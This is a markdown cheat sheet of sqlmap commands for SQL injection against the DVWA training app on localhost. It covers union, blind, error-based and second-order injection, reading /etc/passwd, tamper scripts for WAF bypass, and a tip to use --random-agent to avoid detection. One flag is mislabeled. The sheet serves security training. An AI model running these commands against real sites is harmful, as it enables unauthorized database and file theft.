# SQL Injection Techniques

## Basic Techniques

### 1. Low Security (No Protection)
- No input sanitization
- Direct SQL injection via GET parameter

Example:
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  --batch --dbs
```

### 2. Medium Security (Basic Filtering)
- Uses mysqli_real_escape_string()
- Input via POST form

Example:
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/" \
  --cookie="PHPSESSID=abc123; security=medium" \
  --data="id=1&Submit=Submit" \
  --method POST \
  --random-agent \
  --risk 3
```

### 3. High Security (Advanced Protections)
- Input via cookie/session token
- Time-based SQL injection

Example:
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/session-input.php" \
  --cookie="PHPSESSID=abc123; security=high; id=1" \
  -p id \
  --level=5 \
  --technique=Q
```

## Advanced Techniques

### 1. Union-Based SQL Injection
- Extract data using UNION SELECT
- Brute-force column counts

Example:
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --technique=U \
  --union-cols=1-10
```

### 2. Time-Based Blind SQL Injection
- For when responses are generic
- Uses SLEEP() function

Example:
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --technique=T \
  --time-sec=2 \
  --threads=5
```

### 3. Error-Based SQL Injection
- Extract data from error messages
- Useful for debugging

Example:
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --technique=E \
  --cast=HEXNUM
```

### 4. Second-Order SQL Injection
- Stored payload injection
- Triggered later

Example:
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/" \
  --second-url="http://localhost/dvwa/vulnerabilities/sqli_second_order/"
```

### 5. File System Operations
- Read and write files
- Gain persistent access

Example:
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --file-read="/etc/passwd"
```

## Tamper Scripts

### 1. Basic Tampering
- Bypass simple filters
- Modify payloads

Example:
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/" \
  --tamper=apostrophemask,space2randomblank
```

### 2. Database-Specific
- MySQL-specific techniques
- Type casting

Example:
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
  --dbms=MySQL \
  --no-cast
```

## Best Practices
1. Always use --batch for automation
2. Use --random-agent to avoid detection
3. Start with low risk (--risk 1)
4. Use --level 1 for basic testing
5. Increase --level and --risk gradually
6. Use --tamper scripts for WAF bypass
7. Document all findings

## Security Recommendations
1. Use prepared statements
2. Implement proper input validation
3. Use parameterized queries
4. Enable WAF with proper rules
5. Monitor for suspicious patterns
6. Regular security audits
7. Keep software updated
